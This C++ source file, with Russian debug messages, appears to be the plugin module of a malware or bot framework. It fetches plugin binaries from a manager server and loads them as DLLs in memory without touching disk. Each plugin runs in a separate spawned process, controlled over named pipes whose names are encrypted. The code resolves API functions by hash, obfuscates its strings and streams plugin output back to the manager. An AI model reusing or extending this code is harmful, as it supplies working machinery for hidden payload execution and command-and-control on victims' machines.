#include "plugins.h"
#include "core\pipe.h"
#include "core\debug.h"
#include "core\runinmem.h"
#include "core\crypt.h"
#include "main.h"
#include "manager.h"
#include "sandbox.h"

namespace Plugin
{

static uint idStreamPublic = 0; //ид потока куда отсылаются данные через колбек функцию

static StringBuilder& CreatePipeName( StringBuilder& res, const char* namePlugin )
{
	StringBuilderStack<32> s;
	s = _CS_("plugin_");
	s += namePlugin;
	return Crypt::Name( s, Config::UID, res );
}

class PluginServer : public PipeServer
{
		uint idStream;
		HMODULE dll;

		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );
		virtual void Disconnect();

	public:

		static const int CmdExecuteFunc = 1;

		PluginServer( const char* namePlugin, HMODULE _dll );
		~PluginServer();

		void ExecuteFunc( const char* func, const char* args );
};

PluginServer::PluginServer( const char* namePlugin, HMODULE _dll )
{
	CreatePipeName( name, namePlugin );
	dll = _dll;
}

PluginServer::~PluginServer()
{
}

void HandlerExecuteFunc( Pipe::AutoMsg msg, DWORD tag )
{
	PluginServer* ps = (PluginServer*)tag;
	char* p = (char*)msg->data;
	char* func = p; p += Str::Len(p) + 1;
	char* args = p;
	ps->ExecuteFunc( func, args );
}

int PluginServer::Handler( Pipe::Msg* msgIn, void** msgOut )
{
	int ret = 0;
	switch( msgIn->cmd )
	{
		case CmdExecuteFunc:
			HandlerAsync( HandlerExecuteFunc, msgIn, (DWORD)this );
			break;
	}
	return ret;
}

void PluginServer::Disconnect()
{
	DbgMsg( "Сервер плагина отключен" );
}

void PluginServer::ExecuteFunc( const char* func, const char* args )
{
	DbgMsg( "Выполнение функции %s(%s)", func, args );
	void* addr_func = WinAPI::GetApiAddr( dll, Str::Hash(func) );
	if( addr_func )
	{
		if( args && args[0] )
			((void (WINAPI *)( const char* ))addr_func)(args);
		else
			((void (WINAPI *)())addr_func)();
	}
	else
		DbgMsg( "Функция %s не найдена", func );
}

typedef void (WINAPI *typeSetterCB)( void* addr );

static void WINAPI CBTextFunc( const char* s )
{
	DbgMsg( "CBTextFunc в поток %d отправили %s", idStreamPublic, s );
	ManagerServer::SendVideoStream( idStreamPublic, s, Str::Len(s) );
}

static bool InitPluginCBText( PluginStru* plg, HMODULE dll )
{
	typeSetterCB setter = (typeSetterCB)WinAPI::GetApiAddr( dll, Str::Hash(plg->name_func) );
	if( setter )
	{
		DbgMsg( "Вызов функции %s(%08x) плагина %s", plg->name_func, setter, plg->name );
		setter(CBTextFunc);
		return true;
	}
	else
		DbgMsg( "В плагине %s не найдена функция %s", plg->name, plg->name_func );
	return false;
}

static DWORD WINAPI PluginProcess( void* )
{
	int size;
	byte* data = (byte*)Sandbox::Init(&size);
	Pipe::InitServerPipeResponse();
	PluginStru* plg = (PluginStru*)data;
	byte* body = data + sizeof(PluginStru);
	HMODULE dll = RunInMem::RunDll( body, plg->size );
	if( plg->func_start[0] )
	{
		void* addr_func = WinAPI::GetApiAddr( dll, Str::Hash(plg->func_start) );
		if( addr_func )
		{
			((void (WINAPI *)( const char* ))addr_func)(0);
		}
	}
	PluginServer plgServer( plg->name, dll );
	if( dll )
	{
		DbgMsg( "Плагин %s был запущен", plg->name );
		switch( plg->cbtype )
		{
			case PluginWait:
				plgServer.Start();
				Delay(5000);
				break;
			case PluginCBText:
				idStreamPublic = ManagerServer::CreateVideoStream( 0 /*STREAM_FILE*/, _CS_("cb-plugins"), plg->name_data, _CS_("txt"), 10000 );
				if( idStreamPublic )
				{
					if( InitPluginCBText( plg, dll ) )
					{
						plgServer.Start();
						ManagerServer::CloseStream(idStreamPublic);
						Delay(5000);
					}
				}
				break;
		}
	}
	else
		DbgMsg( "Плагин %s не запустился", plg->name );
	Mem::Free(data);
	API(KERNEL32, ExitProcess)(0);
	return 0;
}

static void LoadedPlugin( Pipe::AutoMsg msg, DWORD tag )
{
	PluginStru* plg = (PluginStru*)tag;
	if( msg->sz_data > 0 )
	{
		DbgMsg( "Плагин %s загружен, размер %d", plg->name, msg->sz_data );
		plg->size = msg->sz_data;
		Mem::Data data( sizeof(PluginStru) + msg->sz_data );
		data.Append( plg, sizeof(PluginStru) );
		data.Append( msg->data, msg->sz_data );
		Sandbox::Run( PluginProcess, 0, data.Ptr(), data.Len(), false );
	}
	else
		DbgMsg( "Плагин %s не загрузился" );
	Mem::Free(plg);
}

void Run( PluginStru* plg )
{
	StringBuilder name( 0, -1, plg->name );
	DWORD tag = (DWORD)Mem::Duplication( plg, sizeof(PluginStru) );
	ManagerServer::LoadPlugin( name, LoadedPlugin, 0, tag );
}

void Stop( const char* namePlugin, const char* func_stop )
{
	if( func_stop )
	{
		ExecuteFunc( namePlugin, func_stop, 0 );
		Delay(5000);
	}
	StringBuilderStack<32> pipeName;
	CreatePipeName( pipeName, namePlugin );
	PipeClient::Send( pipeName, PipeServer::CmdDisconnect, 0, 0 );
}

void ExecuteFunc( const char* namePlugin, const char* func, const char* args )
{
	Mem::Data data(64);
	data.AppendStr(func);
	data.AppendStr(args);
	StringBuilderStack<32> pipeName;
	CreatePipeName( pipeName, namePlugin );
	PipeClient::Send( pipeName, PluginServer::CmdExecuteFunc, data.Ptr(), data.Len() );
}

}
